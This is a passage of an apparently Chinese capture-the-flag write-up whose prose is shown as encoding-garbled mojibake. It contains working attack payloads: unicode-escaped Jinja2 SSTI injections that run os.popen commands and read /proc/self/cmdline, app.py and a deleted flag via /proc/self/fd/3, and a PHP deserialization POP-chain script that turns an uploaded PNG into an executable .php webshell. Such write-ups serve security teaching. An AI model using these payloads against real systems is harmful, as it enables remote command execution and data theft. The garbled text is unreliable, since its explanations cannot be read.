class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#x27;</span>)</span><br></pre></td></tr></table></figure><p>åœ¨configä¸­ä¿å­˜äº†flagåŠ å¯†åçš„å€¼ã€‚</p><p>è¿™é¢˜è¦å¼€ä»£ç†æ‰èƒ½åšï¼Œä¸ç„¶æ–‡ä»¶åŠ è½½ä¸äº†ã€‚ã€‚</p><p><img src="/../images/image-20221008124443508-1686983099354.png" alt="image-20221008124443508"></p><p>æœ‰è¿‡æ»¤ï¼Œunicodeç¼–ç ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[][<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><p>æœ‰å›æ˜¾å½“å‰ç¯å¢ƒä¸‹çš„ç±»ï¼Œé‚£å°±æ­£å¸¸æ‰¾å¯åˆ©ç”¨ç±»çš„ä½ç½®</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">80</span>][<span class="string">&quot;\u006c\u006f\u0061\u0064\u005f\u006d\u006f\u0064\u0075\u006c\u0065&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls /&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221008124706289-1686983099353.png" alt="image-20221008124706289"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ã€‚ç„¶åæ ¹æ®æç¤ºï¼Œå°±éœ€è¦æˆ‘ä»¬è¯»å–pythonæ–‡ä»¶ã€‚</p><h5 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h5><blockquote><ol><li><strong>åœ¨ linux ç³»ç»Ÿä¸­å¦‚æœä¸€ä¸ªç¨‹åºç”¨open()æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ä½†æœ€ç»ˆæ²¡æœ‰å…³é—­ä»–ï¼Œå³ä¾¿ä»å¤–éƒ¨ï¼ˆå¦‚os.remove(SECRET_FILE)ï¼‰åˆ é™¤è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨ &#x2F;proc è¿™ä¸ªè¿›ç¨‹çš„ pid ç›®å½•ä¸‹çš„ fd æ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚</strong></li><li><strong><code>/proc/self</code>åœ¨ä½¿ç”¨æ—¶ï¼Œæˆ‘ä»¬æ˜¯ä¸èƒ½é€šè¿‡å‘½ä»¤çš„æ–¹å¼æ‰§è¡Œé€šè¿‡catå‘½ä»¤è¯»å–cmdlineçš„ï¼Œå› ä¸ºå¦‚æœæ˜¯catè¯»å–&#x2F;proc&#x2F;self&#x2F;cmdlineçš„è¯ï¼Œå¾—åˆ°çš„æ˜¯catè¿›ç¨‹çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡é¢˜ç›®çš„å½“å‰è¿›ç¨‹ä½¿ç”¨è¯»å–æ–‡ä»¶ï¼ˆå¦‚æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæˆ–è€…SSTIä½¿ç”¨fileæ¨¡å—è¯»å–æ–‡ä»¶ï¼‰çš„æ–¹å¼è¯»å–&#x2F;proc&#x2F;self&#x2F;cmdlineã€‚</strong></li></ol></blockquote><ul><li><p>è¯»å–å½“å‰è¿›ç¨‹</p><ul><li><p>&lt;class â€˜_frozen_importlib_external.FileLoaderâ€™&gt;è¿™ä¸ªç±»ï¼Œå…¶ä¸‹æœ‰[â€œget_dataâ€]æ–¹æ³•å¯ä»¥è¯»å–æ–‡ä»¶ã€‚</p></li><li><p>ä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥ç”¨å‘½ä»¤catè¯»å–å‘¢ï¼Ÿ</p><p>å› ä¸º&#x2F;proc&#x2F;selfå­˜å‚¨çš„æ˜¯å½“å‰è¿›ç¨‹ä¸‹çš„ä¿¡æ¯ï¼Œå¦‚æœä½¿ç”¨catå‘½ä»¤è¯»å–çš„å°±æ˜¯catè¿›ç¨‹çš„ä¿¡æ¯ï¼Œè€Œä¸æ˜¯å½“å‰è¿›ç¨‹çš„ä¿¡æ¯ã€‚</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;/proc/self/cmdline&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221008125010896-1686983099354.png" alt="image-20221008125010896"></p><ul><li>è¯»å–app.py,è¿™é‡Œapp.pyä¹Ÿè¢«è¿‡æ»¤äº†</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;\u0061\u0070\u0070\u002e\u0070\u0079&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ•´ç†ä¸€ä¸‹å¾—åˆ°çš„æºç ï¼Œå‘ç°æŠŠæœ€é‡è¦çš„éƒ¨åˆ†æ”¾åœ¨äº†æ³¨é‡Šé‡Œã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/app/flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flag = file.read()</span><br><span class="line">flag = flag[:<span class="number">42</span>]</span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(flag, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span>, <span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;</span>)</span><br><span class="line">flag = os.remove(<span class="string">&quot;/app/flag&quot;</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°flagæ˜æ–‡æ˜¯æ”¾åœ¨&#x2F;app&#x2F;flagä¸­çš„ï¼Œå¹¶ä¸”åªè¿›è¡Œäº†openæ“ä½œï¼Œæ²¡æœ‰closeæ“ä½œã€‚</p><blockquote><p><strong>åœ¨ linux ç³»ç»Ÿä¸­å¦‚æœä¸€ä¸ªç¨‹åºç”¨open()æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ä½†æœ€ç»ˆæ²¡æœ‰å…³é—­ä»–ï¼Œå³ä¾¿ä»å¤–éƒ¨ï¼ˆå¦‚os.remove(SECRET_FILE)ï¼‰åˆ é™¤è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨ &#x2F;proc è¿™ä¸ªè¿›ç¨‹çš„ pid ç›®å½•ä¸‹çš„ fd æ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚</strong></p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬è¦å»è¯»å–&#x2F;proc&#x2F;self&#x2F;fd&#x2F;ï¼Ÿ,å¾—åˆ°&#x2F;app&#x2F;flagæ–‡ä»¶</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>3æ˜¯é€šè¿‡burpçˆ†ç ´å¾—åˆ°çš„ã€‚</p></blockquote><p>å®é™…ä¸Šè¿˜æœ‰å¦ä¸€ç§è§£æ³•ï¼Œå› ä¸ºæç¤ºä¸­ç»™äº†flagæ˜¯æ”¾åœ¨configç¯å¢ƒå˜é‡ä¸­çš„ï¼ŒåŠ å¯†ç®—æ³•ç”¨äº†å¼‚æˆ–æ˜¯å¯¹ç§°åŠ å¯†ï¼Œè€Œä¸”è¿™é“é¢˜æ²¡æœ‰è¿‡æ»¤configï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥<code>&#123;&#123;config&#125;&#125;</code>æ‹¿åˆ°åŠ å¯†åçš„flagï¼Œå¯¹å…¶è¿›è¡ŒåŠ å¯†å°±èƒ½å¾—åˆ°flagçš„æ˜æ–‡å½¢å¼äº†ã€‚</p><h1 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–</h1><h2 id="å¼ºç½‘æ¯-2019-Upload"><a href="#å¼ºç½‘æ¯-2019-Upload" class="headerlink" title="[å¼ºç½‘æ¯ 2019]Upload"></a>[å¼ºç½‘æ¯ 2019]Upload</h2><p>cookieä¸­å­˜åœ¨åºåˆ—åŒ–å†…å®¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">5</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;ID&quot;</span>;i:<span class="number">3</span>;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;123@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">32</span>:<span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">79</span>:<span class="string">&quot;../upload/c47b21fcf8f0bc8b3920541abd8024fd/8052c42ab3b8aa06a3f5f788a4ddccc2.png&quot;</span>&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ä¿å­˜çš„æ˜¯æˆ‘ä»¬ç”¨æˆ·çš„ä¿¡æ¯</p></blockquote><p>ä¿¡æ¯æ”¶é›†å¾—åˆ°æºä»£ç </p><p>åºåˆ—åŒ–</p><p>Login::login</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç™»å½•åï¼Œè®¾ç½®cookie&#123;user:base64_encode(serialize($user_info))&#125;</span></span><br><span class="line">            <span class="variable">$user_info</span>=<span class="title function_ invoke__">db</span>(<span class="string">&quot;user&quot;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;email&quot;</span>,<span class="variable">$email</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$user_info</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) === <span class="variable">$user_info</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">                    <span class="variable">$cookie_data</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user_info</span>));</span><br><span class="line">                    <span class="title function_ invoke__">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable">$cookie_data</span>,<span class="number">3600</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;Login successful!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../home&#x27;</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Login failed!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>Profile::update_cookie</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ›´æ¢å¤´åƒåï¼Œæ›´æ–°cookie</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker-&gt;profile[<span class="string">&#x27;img&#x27;</span>]=<span class="variable language_">$this</span>-&gt;img;</span><br><span class="line">        <span class="title function_ invoke__">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–</p><p>Index::login_check()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$profile</span>=<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$profile</span>))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;profile=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$profile</span>));</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;profile_db=<span class="title function_ invoke__">db</span>(<span class="string">&#x27;user&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;ID&quot;</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">array_diff</span>(<span class="variable">$this</span>-&gt;profile_db,<span class="variable">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¯¥å‡½æ•°ç”¨äºæ£€éªŒç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼Œåœ¨ç™»å½•åçš„æ¯ä¸ªç•Œé¢éƒ½è¦è¢«è°ƒç”¨ã€‚</p></blockquote><p>æ–‡ä»¶ä¸Šä¼ åçš„æ“ä½œ</p><p>ç»å…¸phpæ–‡ä»¶ä¸Šä¼ æ“ä½œï¼Œå¼•ç”¨èœé¸Ÿæ•™ç¨‹çš„gif</p><p><img src="/../images/upload-form.gif" alt="img"></p><p>æœ€åå¾—åˆ°çš„å›¾ç‰‡è·¯å¾„å°±æ˜¯è¿™æ ·çš„</p><p>..&#x2F;upload&#x2F;c47b21fcf8f0bc8b3920541abd8024fd&#x2F;8052c42ab3b8aa06a3f5f788a4ddccc2.png</p><blockquote><p>å› ä¸ºåç¼€åä¸€å®šæ˜¯pngï¼Œæ‰€ä»¥æ­£å¸¸æ¥è¯´æ˜¯æ— æ³•åˆ©ç”¨çš„ï¼Œä½†æ˜¯è¿™é‡Œå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰æ–‡ä»¶å</p></blockquote><p>Profile::upload_img()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">#è°ƒç”¨Index::login_check(),æ£€éªŒç”¨æˆ·æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">login_check</span>())&#123;</span><br><span class="line">                <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirect</span>(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#å¯¹ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶åè¿›è¡Œå¤„ç†</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">            <span class="comment">#è®¾ç½®ä¸´æ—¶æ–‡ä»¶å</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="comment">#è®¾ç½®æ–‡ä»¶åï¼ŒåŠ ä¸Š.pngåç¼€</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename=<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="comment">#æ£€éªŒæ–‡ä»¶åç¼€åæ˜¯å¦ä¸ºpng</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ext_check</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="comment">#è·å–æ–‡ä»¶å¤§å°åˆ¤æ–­æ˜¯å¦ä¸º å›¾ç‰‡</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                <span class="comment">#å°†ä¸´æ—¶æ–‡ä»¶å¤åˆ¶åˆ°åˆ›å»ºçš„æ–‡ä»¶ä¸­</span></span><br><span class="line">                @<span class="title function_ invoke__">copy</span>(<span class="variable">$this</span>-&gt;filename_tmp, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="comment">#è®¾ç½®å›¾ç‰‡è·¯å¾„</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="comment">#æ›´æ–°å¤´åƒå›¾ç‰‡</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">update_img</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Forbidden type!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Unknow file type!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…³æ³¨</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å°†ä¸´æ—¶æ–‡ä»¶å¤åˆ¶åˆ°åˆ›å»ºçš„æ–‡ä»¶ä¸­</span></span><br><span class="line">@<span class="title function_ invoke__">copy</span>(<span class="variable">$this</span>-&gt;filename_tmp, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename_tmp);</span><br><span class="line"><span class="comment">#è®¾ç½®å›¾ç‰‡è·¯å¾„</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>ä»¤filename_tmpä¸ºæˆ‘ä»¬ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶è·¯å¾„</p><p>åªè¦æˆ‘ä»¬å¯ä»¥æ§åˆ¶filenameï¼Œæˆ‘ä»¬å°±å¯ä»¥è‡ªå®šä¹‰æœ¨é©¬æ–‡ä»¶çš„æ–‡ä»¶åï¼Œå°±å¯ä»¥è§£ææœ¨é©¬æ–‡ä»¶</p></blockquote><p>çœ‹ä¸€ä¸‹Profileç±»çš„é­”æœ¯æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å¯ä»¥å¾—åˆ°å¦‚æœè§¦å‘äº†callæ–¹æ³•ï¼Œå°±å¯ä»¥è§¦å‘getæ–¹æ³•ã€‚å› ä¸ºProfileç±»æ²¡æœ‰nameå±æ€§ï¼Œè€Œcallæ–¹æ³•ä¸­è®¿é—®äº†è¿™ä¸ªå±æ€§ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ except[$name]&#x3D;&#x3D;upload_imgï¼Œå°±å¯ä»¥è°ƒç”¨upload_imgæ–¹æ³•ã€‚</p></blockquote><p>å†æ‰¾ä¸€ä¸‹è°èƒ½è§¦å‘callæ–¹æ³•</p><p>Register::destruct</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;registed)&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">index</span>();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><blockquote><p>è®©checkerä¸ºProfileç±»å³å¯</p></blockquote><p>popé“¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Register</span>::<span class="variable constant_">destruct</span> â†’ <span class="title class_">Profile</span>::<span class="variable constant_">call</span> â†’ <span class="title class_">Profile</span>::<span class="variable constant_">get</span> â†’ <span class="title class_">Profile</span>::<span class="variable constant_">upload_img</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#è¦åŠ å‘½åç©ºé—´ï¼Œå¦åˆ™phpä¸çŸ¥é“åºåˆ—åŒ–å“ªä¸€ä¸ªç±»ã€‚</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">web</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$profile</span>-&gt;except = [<span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>-&gt;img = <span class="string">&quot;upload_img&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;ext = <span class="string">&quot;png&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;filename_tmp = <span class="string">&quot;./upload/c47b21fcf8f0bc8b3920541abd8024fd/10fb15c77258a991b0028080a64fb42d.png&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;filename = <span class="string">&quot;./upload/c47b21fcf8f0bc8b3920541abd8024fd/10fb15c77258a991b0028080a64fb42d.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$register</span> = <span class="keyword">new</span> <span class="title class_">Register</span>();</span><br><span class="line"><span class="variable">$register</span>-&gt;registed = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$register</span>-&gt;checker = <span class="variable">$profile</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$register</span>)));</span><br></pre></td></tr></table></figure><p>æŠŠå¾—åˆ°çš„åºåˆ—åŒ–å†…å®¹æ”¾å…¥cookieä¸­ï¼Œåˆ·æ–°å‡ 